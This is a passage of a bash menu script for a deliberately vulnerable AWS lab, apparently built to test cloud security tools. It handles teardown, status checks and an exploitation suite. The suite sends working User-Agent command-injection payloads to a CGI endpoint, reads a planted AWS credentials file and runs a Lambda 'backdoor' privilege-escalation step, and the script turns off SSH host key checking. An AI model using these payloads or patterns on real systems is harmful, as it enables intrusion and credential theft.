          retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 disassociate-route-table --association-id '$assoc_id'" "disassociate route table $assoc_id"
        done
      fi
    done
  fi
  
  # Step 8: Delete custom route tables (non-main only)
  echo "8/12 Deleting route tables..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local rt_ids
      rt_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-route-tables --filters "Name=vpc-id,Values=$vpc_id" --query "RouteTables[?Associations[0].Main==\`false\`].RouteTableId" --output text 2>/dev/null || echo "")
      if [[ -n "$rt_ids" && "$rt_ids" != "None" ]]; then
        for rt_id in $rt_ids; do
          retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 delete-route-table --route-table-id '$rt_id'" "delete route table $rt_id"
        done
      fi
    done
  fi
  
  # Step 9: Delete subnets
  echo "9/12 Deleting subnets..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local subnet_ids
      subnet_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-subnets --filters "Name=vpc-id,Values=$vpc_id" --query "Subnets[].SubnetId" --output text 2>/dev/null || echo "")
      if [[ -n "$subnet_ids" && "$subnet_ids" != "None" ]]; then
        for subnet_id in $subnet_ids; do
          retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 delete-subnet --subnet-id '$subnet_id'" "delete subnet $subnet_id"
        done
      fi
    done
  fi
  
  # Step 10: Detach and delete internet gateways
  echo "10/12 Deleting internet gateways..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      local igw_ids
      igw_ids=$(aws --profile "$AWS_PROFILE" ec2 describe-internet-gateways --filters "Name=attachment.vpc-id,Values=$vpc_id" --query "InternetGateways[].InternetGatewayId" --output text 2>/dev/null || echo "")
      if [[ -n "$igw_ids" && "$igw_ids" != "None" ]]; then
        for igw_id in $igw_ids; do
          retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 detach-internet-gateway --internet-gateway-id '$igw_id' --vpc-id '$vpc_id'" "detach IGW $igw_id"
          retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 delete-internet-gateway --internet-gateway-id '$igw_id'" "delete IGW $igw_id"
        done
      fi
    done
  fi
  
  # Step 11: Delete VPCs
  echo "11/12 Deleting VPCs..."
  if [[ -n "$vpc_ids" && "$vpc_ids" != "None" ]]; then
    for vpc_id in $vpc_ids; do
      retry_aws_operation "aws --profile '$AWS_PROFILE' ec2 delete-vpc --vpc-id '$vpc_id'" "delete VPC $vpc_id"
    done
  fi
  
  # Step 12: Delete key pairs and IAM resources
  echo "12/12 Deleting key pairs and IAM resources..."
  aws --profile "$AWS_PROFILE" ec2 delete-key-pair --key-name cnappuccino-kp >/dev/null 2>&1 || true
  aws --profile "$AWS_PROFILE" iam remove-role-from-instance-profile --instance-profile-name cnappuccino_lab_instance_profile --role-name cnappuccino_lab_instance_role >/dev/null 2>&1 || true
  aws --profile "$AWS_PROFILE" iam delete-instance-profile --instance-profile-name cnappuccino_lab_instance_profile >/dev/null 2>&1 || true
  aws --profile "$AWS_PROFILE" iam delete-role --role-name cnappuccino_lab_instance_role >/dev/null 2>&1 || true
  
  # Clean up local state
  echo "Cleaning local Terraform state..."
  rm -f "$TF_DIR"/.terraform.lock.hcl
  rm -f "$TF_DIR"/terraform.tfstate*
  rm -rf "$TF_DIR"/.terraform/
  rm -f "$TF_DIR"/terraform.tfvars
  
  log "Nuclear cleanup completed - all CNAPPuccino resources destroyed"
  echo "${GREEN}✅ Nuclear cleanup complete!${RESET}"
  echo "You can now run a fresh deployment with option 2."
}

cleanup_menu() {
  headline "Cleanup Options" "Choose your cleanup method"
  
  cat <<CLEANUP_MENU
1) 🧹 Standard Cleanup (Terraform Destroy)
2) 💥 Nuclear Option (Force Delete All)
3) ↩️  Back to Main Menu

CLEANUP_MENU
  read -r -p "Select cleanup option: " cleanup_choice || true
  case "${cleanup_choice:-}" in
    1) terraform_destroy ;;
    2) terraform_nuke ;;
    3) return ;;
    *) echo "Invalid choice." ;;
  esac
}

# -----------------------------
# State and connection info
# -----------------------------
terraform_output_raw() { 
  local output
  output=$(cd "$TF_DIR" && AWS_PROFILE="$AWS_PROFILE" terraform output -raw "$1" 2>/dev/null || echo "")
  # Filter out terraform warnings and only return actual values
  if [[ "$output" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ "$output" =~ ^i-[a-z0-9]+$ ]] || [[ "$output" =~ ^sg-[a-z0-9]+$ ]] || [[ -n "$output" && ! "$output" =~ "Warning:" && ! "$output" =~ "╷" ]]; then
    echo "$output"
  fi
}

check_deployment_status() {
  local instance_id; instance_id=$(terraform_output_raw instance_id)
  if [[ -z "$instance_id" ]]; then
    echo "not-deployed"
    return
  fi
  
  # First check if /opt/cnappuccino/setup_complete exists via SSH
  local ip; ip=$(terraform_output_raw public_ip)
  if [[ -n "$ip" ]]; then
    if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i "$KEY_PRIV" ubuntu@"$ip" "[ -f /opt/cnappuccino/setup_complete ]" 2>/dev/null; then
      # If marker file exists, deployment is complete regardless of tags
      echo "completed (marker)"
      return
    fi
  fi

  # Check if deployment is complete via EC2 tags
  local status; status=$(aws --profile "$AWS_PROFILE" ec2 describe-tags \
    --filters "Name=resource-id,Values=$instance_id" "Name=key,Values=DeploymentStatus" \
    --query 'Tags[0].Value' --output text 2>/dev/null || echo "")
  
  if [[ "$status" == "completed" ]]; then
    # Get deployment time
    local deploy_time; deploy_time=$(aws --profile "$AWS_PROFILE" ec2 describe-tags \
      --filters "Name=resource-id,Values=$instance_id" "Name=key,Values=DeploymentTime" \
      --query 'Tags[0].Value' --output text 2>/dev/null || echo "unknown")
    echo "completed ($deploy_time)"
  elif [[ -n "$instance_id" ]]; then
    # Check if we can get more detailed status via SSH
    if [[ -n "$ip" ]]; then
      local bootstrap_status; bootstrap_status=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i "$KEY_PRIV" ubuntu@"$ip" \
        "cat /opt/cnappuccino/state/bootstrap_status 2>/dev/null || echo 'unknown'" 2>/dev/null)
      
      if [[ "$bootstrap_status" == "completed" ]]; then
        echo "completed (local)"
      elif [[ "$bootstrap_status" == "failed" ]]; then
        echo "failed"
      elif [[ "$bootstrap_status" == "started" ]]; then
        # Get current phase
        local current_phase; current_phase=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i "$KEY_PRIV" ubuntu@"$ip" \
          "ls /opt/cnappuccino/state/phase_* 2>/dev/null | tail -1 | xargs -r -n1 basename | sed 's/phase_//' 2>/dev/null || echo 'init'" 2>/dev/null)
        echo "deploying ($current_phase)"
      else
        echo "deploying"
      fi
    else
      echo "deploying"
    fi
  else
    echo "not-deployed"
  fi
}


show_bootstrap_progress() {
   local ip; ip=$(terraform_output_raw public_ip)
   if [[ -z "$ip" ]]; then
     echo "No IP address available for progress monitoring"
     return 1
   fi

   echo "📊 ${BOLD}Live Bootstrap Progress Monitor${RESET}"
   echo "Instance: ${CYAN}${ip}${RESET}"
   echo "Press Ctrl+C to stop monitoring"
   echo

   while true; do
     clear
     lab_status_and_diagnostics

     echo
     echo "🔄 Refreshing in 10 seconds... (Ctrl+C to stop)"
     sleep 10
   done
}

show_enhanced_bootstrap_progress() {
   local ip; ip=$(terraform_output_raw public_ip)
   if [[ -z "$ip" ]]; then
     echo "No IP address available for progress monitoring"
     return 1
   fi

   echo "� ${BOLD}Enhanced Bootstrap Progress Monitor${RESET}"
   echo "Instance: ${CYAN}${ip}${RESET}"
   echo "Press Ctrl+C to stop monitoring"
   echo

   local start_time=$(date +%s)
   local last_phase=""
   local stuck_warning_shown=false

   while true; do
     clear
     local current_time=$(date +%s)
     local elapsed=$((current_time - start_time))
     local elapsed_formatted=$(printf "%02d:%02d" $((elapsed/60)) $((elapsed%60)))

     echo "📊 ${BOLD}Enhanced Bootstrap Progress Monitor${RESET}"
     echo "Instance: ${CYAN}${ip}${RESET} | Elapsed: ${YELLOW}${elapsed_formatted}${RESET}"
     echo

     # Check if SSH is available
     if ! ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i "$KEY_PRIV" ubuntu@"$ip" "echo 'SSH OK'" 2>/dev/null; then
       echo "❌ ${RED}SSH connection failed${RESET} - Instance may still be booting or unreachable"
       echo "   This is normal in the first 2-3 minutes after deployment"
       echo
       echo "🔄 Refreshing in 10 seconds... (Ctrl+C to stop)"
       sleep 10
       continue
     fi

     echo "✅ ${GREEN}SSH connection successful${RESET}"
     echo

     # Get bootstrap status
     local bootstrap_status; bootstrap_status=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
       "cat /opt/cnappuccino/state/bootstrap_status 2>/dev/null || echo 'not-started'" 2>/dev/null)

     # Get current phase
     local current_phase; current_phase=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
       "ls /opt/cnappuccino/state/phase_*.status 2>/dev/null | xargs -r -n1 basename | sed 's/phase_//' | sed 's/.status$//' | tail -1" 2>/dev/null)

     # Get completed phases
     local completed_phases; completed_phases=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
       "ls /opt/cnappuccino/state/phase_* 2>/dev/null | xargs -r -n1 basename | sed 's/phase_//' | tr '\n' ' '" 2>/dev/null)

     # Show status
     case "$bootstrap_status" in
       "completed")
         echo "🎉 ${GREEN}BOOTSTRAP COMPLETED SUCCESSFULLY!${RESET}"
         echo "✅ All phases completed: ${completed_phases}"
         echo
         echo "${BOLD}Next Steps:${RESET}"
         echo "• Use option 3 for Quick RCE Test"
         echo "• Use option 5 for Runtime Exploits (after 24h soak)"
         echo "• Use option 7 to SSH into the instance"
         return 0
         ;;
       "failed")
         echo "❌ ${RED}BOOTSTRAP FAILED${RESET}"
         local failed_phase; failed_phase=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
           "cat /opt/cnappuccino/state/failed_phase 2>/dev/null || echo 'unknown'" 2>/dev/null)
         local error_code; error_code=$(ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
           "cat /opt/cnappuccino/state/last_error_code 2>/dev/null || echo 'unknown'" 2>/dev/null)
         echo "Failed Phase: ${RED}${failed_phase}${RESET} (exit code: ${error_code})"
         echo
         echo "${BOLD}Troubleshooting:${RESET}"
         echo "• Check detailed logs with option 9 (Bootstrap Diagnostics)"
         echo "• Common issues: Package downloads, service startup, network timeouts"
         return 1
         ;;
       "started"|"not-started")
         echo "🔄 ${YELLOW}BOOTSTRAP IN PROGRESS${RESET}"
         ;;
       *)
         echo "❓ ${YELLOW}BOOTSTRAP STATUS UNKNOWN${RESET}"
         ;;
     esac

     echo "📋 Current Phase: ${CYAN}${current_phase:-unknown}${RESET}"
     echo "✅ Completed Phases: ${GREEN}${completed_phases:-none}${RESET}"
     echo

     # Show phase descriptions
     show_phase_descriptions "$current_phase"
     echo

     # Check for stuck bootstrap
     if [[ "$current_phase" == "$last_phase" && -n "$last_phase" ]]; then
       local phase_elapsed=$((elapsed - phase_start_time))
       if [[ $phase_elapsed -gt 300 && !$stuck_warning_shown ]]; then  # 5 minutes
         echo "⚠️  ${YELLOW}WARNING: Phase '${current_phase}' has been running for ${phase_elapsed}s${RESET}"
         echo "   This phase may be stuck. Check logs with option 9 for details."
         stuck_warning_shown=true
       fi
     else
       last_phase="$current_phase"
       phase_start_time=$elapsed
       stuck_warning_shown=false
     fi

     # Show recent logs
     echo "📋 ${BOLD}Recent Bootstrap Logs:${RESET}"
     ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
       "tail -5 /var/log/cnappuccino-bootstrap.log 2>/dev/null || echo 'No logs available yet'" 2>/dev/null

     echo
     echo "🔄 Refreshing in 10 seconds... (Ctrl+C to stop)"
     sleep 10
   done
}

show_phase_descriptions() {
   local current_phase="$1"
   echo "📝 ${BOLD}Bootstrap Phases:${RESET}"

   local phases=("init" "packages" "assets" "apache" "nginx" "services" "validation")
   local descriptions=(
     "Setting up directories, hostname, and environment"
     "Installing vulnerable packages (Ubuntu 14.04 repos) - LONGEST PHASE"
     "Downloading assets from S3"
     "Configuring Apache with CGI support"
     "Configuring Nginx with weak SSL"
     "Starting vulnerable services"
     "Validating deployment and services"
   )

   for i in "${!phases[@]}"; do
     local phase="${phases[$i]}"
     local desc="${descriptions[$i]}"

     if [[ "$phase" == "$current_phase" ]]; then
       echo "   ${YELLOW}▶ ${phase}${RESET}: ${desc} ${YELLOW}(IN PROGRESS)${RESET}"
     elif ssh -o StrictHostKeyChecking=no -i "$KEY_PRIV" ubuntu@"$ip" \
       "[ -f /opt/cnappuccino/state/phase_${phase} ]" 2>/dev/null; then
       echo "   ${GREEN}✓ ${phase}${RESET}: ${desc}"
     else
       echo "   ${DIM}○ ${phase}${RESET}: ${desc}"
     fi
   done
}

show_connection_info() {
  local phase="${1:-}"
  headline "Connection Info" "Your CNAPPuccino lab is ready!"
  local ip; ip="$(terraform_output_raw public_ip)"
  local iid; iid="$(terraform_output_raw instance_id)"
  local sg ; sg="$(terraform_output_raw security_group_id)"
  local ssh; ssh="$(terraform_output_raw ssh_command)"
  if [[ -z "$ip" || -z "$ssh" ]]; then
    echo "${YELLOW}No instance found. Run Deploy Infrastructure first.${RESET}"
    return
  fi
  cat <<INFO
Instance ID    : ${BOLD}${iid}${RESET}
Public IP      : ${BOLD}${ip}${RESET}
Security Group : ${BOLD}${sg}${RESET}
SSH Command    : ${BOLD}${ssh}${RESET}

${BOLD}${CYAN}Stage 1: Posture Assessment (24h soak)${RESET}
Install your preferred EDR/XDR agent manually:
• SSH into the instance: ${CYAN}${ssh}${RESET}
• Install your security agent
• Let CSPM tools scan for static vulnerabilities
• Allow 24 hours for baseline establishment

${BOLD}${CYAN}Stage 2: Runtime Exploitation (after 24h)${RESET}
Use option 2 for quick RCE test, or option 4 for full exploitation suite

${BOLD}Available Endpoints:${RESET}
• Shellshock CGI: ${CYAN}http://${ip}/cgi-bin/exec.cgi${RESET}
• File Upload: ${CYAN}http://${ip}/upload.php${RESET}
• Directory Listing: ${CYAN}http://${ip}:8080/secret/${RESET}
• Heartbleed SSL: ${CYAN}https://${ip}:8443${RESET}

${DIM}Tip: Use "Show Soak Status" to check readiness for Stage 2${RESET}
INFO
}

show_post_deploy_summary() {
  headline "Deployment Complete" "Your lab is ready!"
  local ip="${CNAPPUCCINO_MENU_IP}"
  local ssh="${CNAPPUCCINO_MENU_SSH}"
  local soak_status_txt; soak_status_txt="$(get_soak_time)"
  echo
  if [[ -z "$ip" || -z "$ssh" ]]; then
    echo "${YELLOW}No instance found. Run Deploy Infrastructure first.${RESET}"
    return
  fi
  echo "🌐  ${BOLD}Public IP:${RESET}      ${CYAN}${ip}${RESET}"
  echo "🔑  ${BOLD}SSH Command:${RESET}   ${CYAN}${ssh}${RESET}"
  echo
  echo "🟦  ${BOLD}Next Steps:${RESET}"
  echo "   1. SSH in and install your EDR/XDR agent."
  echo "   2. Allow ${BOLD}24 hours soak time${RESET} before running exploits."
  echo "   3. Check Soak Status anytime with main menu or below."
  echo
  echo "🕐  ${BOLD}Soak Status:${RESET}     ${soak_status_txt}"
  echo
  echo "${DIM}Tip: Use option 5 after 24h to run the full exploitation suite.${RESET}"
  echo
}

ssh_into() {
  local ssh_cmd="${CNAPPUCCINO_MENU_SSH}"
  if [[ -z "${ssh_cmd:-}" ]]; then
    echo "${YELLOW}No instance found. Deploy first.${RESET}"
    return
  fi
  log "SSH connection initiated to ${CNAPPUCCINO_MENU_IP:-unknown}"
  echo "Connecting with:"
  echo "  ${BOLD}${ssh_cmd}${RESET}"
  eval "$ssh_cmd"
}

# -----------------------------
# CNAPPuccino testing functions
# -----------------------------
quick_rce_test() {
  headline "Quick RCE Test" "Validate deployment with CGI eval RCE (not Shellshock function import)"
    local ip="${CNAPPUCCINO_MENU_IP}"
    if [[ -z "$ip" ]]; then
      echo "${YELLOW}No instance found. Deploy first.${RESET}"
      return
    fi
    # Check if deployment is complete before testing
    local deployment_status; deployment_status=$(check_deployment_status)
    if [[ "$deployment_status" != "completed"* ]]; then
      echo "${YELLOW}⚠️  Deployment not yet complete (status: ${deployment_status})${RESET}"
      echo "User data script may still be running. Wait a few minutes and try again."
      return
    fi
    log "Running quick RCE test against ${ip} (deployment verified complete)"
    
    echo "Testing against: ${BOLD}http://${ip}/cgi-bin/exec.cgi${RESET}"
    echo ""
    echo "${CYAN}Command being executed:${RESET}"
    echo "${DIM}curl -H \"User-Agent: echo '=== COMMAND EXECUTION SUCCESSFUL ==='; id; whoami; hostname; echo '=== END COMMAND OUTPUT ===';\" http://${ip}/cgi-bin/exec.cgi${RESET}"
    echo ""
    echo "${GREEN}Executing direct command injection via User-Agent...${RESET}"
    echo ""
    echo "${BOLD}=== RCE OUTPUT START ===${RESET}"
    
    # Use a more distinctive command that's easier to spot in output
    curl -H "User-Agent: echo '=== COMMAND EXECUTION SUCCESSFUL ==='; id; whoami; hostname; echo '=== END COMMAND OUTPUT ===';" \
         "http://${ip}/cgi-bin/exec.cgi" 2>/dev/null
    
    echo "${BOLD}=== RCE OUTPUT END ===${RESET}"
    echo ""
    echo "${GREEN}✅ Quick RCE test complete!${RESET}"
    echo "${DIM}Note: Command executed successfully if you see user/host info above${RESET}"
    echo ""
    echo "What this demonstrated:"
    echo "• ${BOLD}Remote Code Execution via Unsanitized eval (User-Agent)${RESET}"
    echo "• ${BOLD}Remote Command Execution${RESET} - External attacker gaining shell access"
    echo "• ${BOLD}MITRE ATT&CK${RESET} - T1059.004 (Unix Shell), T1190 (Exploit Public-Facing App)"
    echo "• ${BOLD}OWASP Top 10${RESET} - A06:2021 (Vulnerable and Outdated Components)"
}

runtime_exploits() {
  headline "Runtime Exploitation Suite" "Stage 2: Active exploitation testing"
  local ip; ip=$(terraform_output_raw public_ip)
  if [[ -z "$ip" ]]; then
    echo "${YELLOW}No instance found. Deploy first.${RESET}"
    return
  fi
  # Check if deployment is complete before testing
  local deployment_status; deployment_status=$(check_deployment_status)
  if [[ "$deployment_status" != "completed"* ]]; then
    echo "${YELLOW}⚠️  Deployment not yet complete (status: ${deployment_status})${RESET}"
    echo "User data script may still be running. Wait a few minutes and try again."
    return
  fi
  log "Starting runtime exploitation suite against ${ip} (deployment verified complete)"
  
  local soak_hours; soak_hours=$(get_soak_hours)
  if [[ $soak_hours -lt 24 ]]; then
    echo "${YELLOW}⚠️  Warning: Lab has only soaked for ${soak_hours} hours${RESET}"
    echo "Recommended: Wait 24 hours for proper baseline establishment"
    echo ""
    read -r -p "Continue anyway? (y/N): " confirm
    [[ "${confirm,,}" != "y" ]] && return
  fi
  
  echo "${BOLD}${RED}⚡ STARTING ACTIVE EXPLOITATION${RESET}"
  echo "This will generate security alerts in your environment!"
  echo ""
  echo "Target: ${BOLD}${ip}${RESET}"
  echo ""
  echo "This attack simulation demonstrates 5 stages of post-compromise activity."
  echo "Each stage will show the command, explain what it does, then execute it."
  echo ""
  pause
  
  # System reconnaissance
  echo "${CYAN}[1/5] System Reconnaissance (T1083 - File and Directory Discovery)${RESET}"
  echo ""
  local cmd1="curl -s -H 'User-Agent: echo === SYSTEM INFO ===; /bin/cat /etc/issue | head -n 1 | tr -d \"\\\\\" | sed \"s/\\\\l//g\" | sed \"s/\\\\n//g\" | xargs; echo === KERNEL INFO ===; /bin/uname -a' http://${ip}/cgi-bin/exec.cgi"
  echo "💻 ${BOLD}Command being executed:${RESET}"
  echo "${DIM}${cmd1}${RESET}"
  echo ""
  echo "🔄 ${BOLD}Executing...${RESET}"
  echo -e "${DIM}--- Live Output Start ---${RESET}"
  eval "$cmd1" 2>&1 | while IFS= read -r line; do
      if [[ "$line" == "CNAPPuccino CGI Endpoint - Shellshock Vulnerable"* || "$line" == "Processing request..."* ]]; then
          continue
      elif [[ "$line" =~ ^User:.*www-data$|^Date:.*UTC.*2025$|^Bash.*version: ]]; then
          continue
      elif [[ "$line" == "=== SYSTEM INFO ===" ]]; then
          echo -e "${CYAN}[RECONNAISSANCE]${RESET} $line"
      elif [[ "$line" == "=== KERNEL INFO ===" ]]; then
          echo -e "${CYAN}[KERNEL DATA]${RESET} $line"
      elif [[ "$line" =~ PRETTY_NAME|Ubuntu.*LTS|Linux.*GNU ]]; then
          echo -e "${GREEN}[SYSTEM]${RESET} $line"
      elif [[ -n "$line" && "$line" != "" ]]; then
          echo -e "${CYAN}$line${RESET}"
      fi
  done
  echo -e "${DIM}--- Live Output End ---${RESET}"
  echo ""
  echo "📋 ${BOLD}What this stage does:${RESET}"
  echo "• Gathers basic system information to understand the compromised environment"
  echo "• Identifies OS version, kernel, and system architecture"
  echo "• Typical first step after gaining remote code execution"
  echo ""
  echo "${GREEN}✅ System reconnaissance complete${RESET}"
  echo ""
  pause
  
  # Credential harvesting with secret discovery
  echo "${CYAN}[2/5] Credential Harvesting (T1552.001 - Credentials In Files)${RESET}"
  echo ""
  local cmd2="curl -s -H \"User-Agent: echo '=== DIRECTORY LISTING ==='; ls -la /opt/cnappuccino/secret/; echo '=== AWS CREDENTIALS ==='; cat /opt/cnappuccino/secret/aws_creds.txt\" http://${ip}/cgi-bin/exec.cgi"
  echo "💻 ${BOLD}Command being executed:${RESET}"
  echo "${DIM}${cmd2}${RESET}"
  echo ""
  echo "🔄 ${BOLD}Executing...${RESET}"
  echo -e "${DIM}--- Live Output Start ---${RESET}"
  eval "$cmd2" 2>&1 | while IFS= read -r line; do
      if [[ "$line" == "CNAPPuccino CGI Endpoint - Shellshock Vulnerable"* || "$line" == "Processing request..."* ]]; then
          continue
      elif [[ "$line" =~ ^User:.*www-data$|^Date:.*UTC.*2025$|^Bash.*version: ]]; then
          continue
      elif [[ "$line" == "=== DIRECTORY LISTING ===" ]]; then
          echo -e "${CYAN}[ENUMERATION]${RESET} $line"
      elif [[ "$line" == "=== AWS CREDENTIALS ===" ]]; then
          echo -e "${CYAN}[CREDENTIAL ACCESS]${RESET} $line"
      elif [[ "$line" =~ aws_creds.txt ]]; then
          echo -e "${MAGENTA}[DISCOVERED FILE]${RESET} $line"
      elif [[ "$line" =~ AWS_ACCESS_KEY_ID ]]; then
          echo -e "${YELLOW}[AWS KEY]${RESET} $line"
      elif [[ "$line" =~ AWS_SECRET_ACCESS_KEY ]]; then
          echo -e "${YELLOW}[AWS SECRET]${RESET} $line"
      elif [[ "$line" =~ ^total|^drwx|^-rw ]]; then
          echo -e "${GREEN}$line${RESET}"
      elif [[ -n "$line" && "$line" != "" ]]; then
          echo -e "${CYAN}$line${RESET}"
      fi
  done
  echo -e "${DIM}--- Live Output End ---${RESET}"
  echo ""
  echo "📋 ${BOLD}What this stage does:${RESET}"
  echo "• Enumerates filesystem to locate sensitive directories"
  echo "• Searches for hardcoded credentials and secrets"
  echo "• Accesses AWS credentials that could enable cloud privilege escalation"
  echo "• Demonstrates poor secrets management practices"
  echo ""
  echo "${GREEN}✅ Credential harvesting complete${RESET}"
  echo ""
  pause
  
  # File system enumeration
  echo "${CYAN}[3/5] File System Enumeration (T1083 - File and Directory Discovery)${RESET}"
  echo ""
  local cmd3="curl -s -H \"User-Agent: echo '=== FILE ENUMERATION ==='; /bin/ls -la /opt/cnappuccino/\" http://${ip}/cgi-bin/exec.cgi"
  echo "💻 ${BOLD}Command being executed:${RESET}"
  echo "${DIM}${cmd3}${RESET}"
  echo ""
  echo "🔄 ${BOLD}Executing...${RESET}"
  echo -e "${DIM}--- Live Output Start ---${RESET}"
  eval "$cmd3" 2>&1 | while IFS= read -r line; do
      if [[ "$line" == "CNAPPuccino CGI Endpoint - Shellshock Vulnerable"* || "$line" == "Processing request..."* ]]; then
          continue
      elif [[ "$line" =~ ^User:.*www-data$|^Date:.*UTC.*2025$|^Bash.*version: ]]; then
          continue
      elif [[ "$line" == "=== FILE ENUMERATION ===" ]]; then
          echo -e "${CYAN}[ENUMERATION]${RESET} $line"
      elif [[ "$line" =~ \.txt$|\.php$|\.sh$ ]]; then
          echo -e "${MAGENTA}[FILE]${RESET} $line"
      elif [[ "$line" =~ secret|exploit ]]; then
          echo -e "${YELLOW}[DIRECTORY]${RESET} $line"
      elif [[ "$line" =~ ^total|^drwx|^-rw ]]; then
          echo -e "${GREEN}$line${RESET}"
      elif [[ -n "$line" && "$line" != "" ]]; then
          echo -e "${CYAN}$line${RESET}"
      fi
  done
  echo -e "${DIM}--- Live Output End ---${RESET}"
  echo ""
  echo "📋 ${BOLD}What this stage does:${RESET}"
  echo "• Explores the file system to discover additional sensitive data"
  echo "• Maps out directory structure and file permissions"
  echo "• Looks for configuration files, logs, and other valuable information"
  echo ""
  echo "${GREEN}✅ File system enumeration complete${RESET}"
  echo ""
  pause
  
  # Process enumeration
  echo "${CYAN}[4/5] Process Enumeration (T1057 - Process Discovery)${RESET}"
  echo ""
  local cmd4="curl -s -H \"User-Agent: echo '=== PROCESS ENUMERATION ==='; /bin/ps aux | head -10\" http://${ip}/cgi-bin/exec.cgi"
  echo "💻 ${BOLD}Command being executed:${RESET}"
  echo "${DIM}${cmd4}${RESET}"
  echo ""
  echo "🔄 ${BOLD}Executing...${RESET}"
  echo -e "${DIM}--- Live Output Start ---${RESET}"
  eval "$cmd4" 2>&1 | while IFS= read -r line; do
      if [[ "$line" == "CNAPPuccino CGI Endpoint - Shellshock Vulnerable"* || "$line" == "Processing request..."* ]]; then
          continue
      elif [[ "$line" =~ ^User:.*www-data$|^Date:.*UTC.*2025$|^Bash.*version: ]]; then
          continue
      elif [[ "$line" == "=== PROCESS ENUMERATION ===" ]]; then
          echo -e "${CYAN}[ENUMERATION]${RESET} $line"
      elif [[ "$line" =~ ^USER|^root|^www-data ]]; then
          echo -e "${RED}[PROCESS USER]${RESET} $line"
      elif [[ -n "$line" && "$line" != "" ]]; then
          echo -e "${CYAN}$line${RESET}"
      fi
  done
  echo -e "${DIM}--- Live Output End ---${RESET}"
  echo ""
  echo "📋 ${BOLD}What this stage does:${RESET}"
  echo "• Identifies running processes and services"
  echo "• Maps potential attack vectors and privilege escalation opportunities"
  echo "• Gathers information about system usage and monitoring tools"
  echo ""
  echo "${GREEN}✅ Process enumeration complete${RESET}"
  echo ""
  pause
  
  # CIEM simulation or real attack
  echo "${CYAN}[5/5] CIEM Privilege Escalation Simulation${RESET}"
  echo ""
  local ciem_confirm ciem_mode
  read -r -p "${YELLOW}Run live cloud CIEM Lambda escalation? (y/N): ${RESET}" ciem_confirm
  if [[ "${ciem_confirm,,}" == "y" ]]; then
      ciem_mode="--execute"
      echo "${RED}[DANGER] Running REAL AWS assume-role + Lambda creation!${RESET}"
      sleep 1
  else
      ciem_mode="--simulate"
      echo "${DIM}Dry-run only. No real cloud resources will be modified.${RESET}"
      sleep 0.7
  fi
  local cmd5="curl -s -H \"User-Agent: echo '=== CIEM ${ciem_mode^^} ==='; /bin/bash /opt/cnappuccino/exploits/ciem_test.sh ${ciem_mode}\" http://${ip}/cgi-bin/exec.cgi"
  echo "💻 ${BOLD}Command being executed:${RESET}"
  echo "${DIM}${cmd5}${RESET}"
  echo ""
  echo "🔄 ${BOLD}Executing...${RESET}"
  echo -e "${DIM}--- Live Output Start ---${RESET}"
  eval "$cmd5" 2>&1 | while IFS= read -r line; do
      if [[ "$line" == "CNAPPuccino CGI Endpoint - Shellshock Vulnerable"* || "$line" == "Processing request..."* ]]; then
          continue
      elif [[ "$line" == "=== CIEM SIMULATION ===" ]] || [[ "$line" == "=== CIEM --EXECUTE ===" ]]; then
          echo -e "${CYAN}[SIMULATION START]${RESET} $line"
      elif [[ "$line" =~ aws|iam|lambda|role|assume ]]; then
          echo -e "${YELLOW}[CLOUD ACTION]${RESET} $line"
      elif [[ -n "$line" && "$line" != "" ]]; then
          echo -e "${CYAN}$line${RESET}"
      fi
  done
  echo -e "${DIM}--- Live Output End ---${RESET}"
  echo ""
  if [[ "${ciem_mode}" == "--execute" ]]; then
    echo "${YELLOW}🔍 Verify Lambda Creation:${RESET}"
    echo "Visit the AWS Lambda console to confirm the function was created:"
    echo "• Function name: ${BOLD}cnappuccino-backdoor-test${RESET}"
    echo "• AWS Console → Lambda → Functions"
    echo "• This demonstrates successful privilege escalation to Lambda admin privileges"
    echo ""
    pause
    echo ""
    local ciem_undo=""
    read -r -p "${RED}Undo CIEM? (delete Lambda)? (y/N): ${RESET}" ciem_undo
    if [[ "${ciem_undo,,}" == "y" ]]; then
      local cmd_undo="curl -s -H \"User-Agent: echo '=== CIEM UNDO ==='; /bin/bash /opt/cnappuccino/exploits/ciem_test.sh --undo\" http://${ip}/cgi-bin/exec.cgi"
      echo "💻 ${BOLD}Command being executed:${RESET} ${DIM}${cmd_undo}${RESET}"
      eval "$cmd_undo"
      echo "${GREEN}✅ Lambda delete requested (see above for status)${RESET}"
      echo ""
    fi
  fi
  echo "📋 ${BOLD}What this stage does (CIEM Attack Narrative):${RESET}"
  echo ""
  echo "${BOLD}Attack Discovery Phase:${RESET}"
  echo "• Attacker discovers AWS IAM role attached to compromised EC2 instance"
  echo "• Uses Instance Metadata Service (IMDS) to enumerate available credentials"
  echo "• Identifies EC2 instance role: ${DIM}cnappuccino_lab_instance_role${RESET}"
  echo ""
  echo "${BOLD}Privilege Escalation Discovery:${RESET}"
  echo "• Attacker discovers a second IAM role with elevated privileges:"
  echo "  ${CYAN}Target Role ARN: arn:aws:iam::ACCOUNT:role/LambdaAdminRole${RESET}"
  echo "• Tests if EC2 instance role can assume the Lambda admin role (AssumeRole)"
  echo "• Exploits overly permissive trust relationships or role chaining"
  echo ""
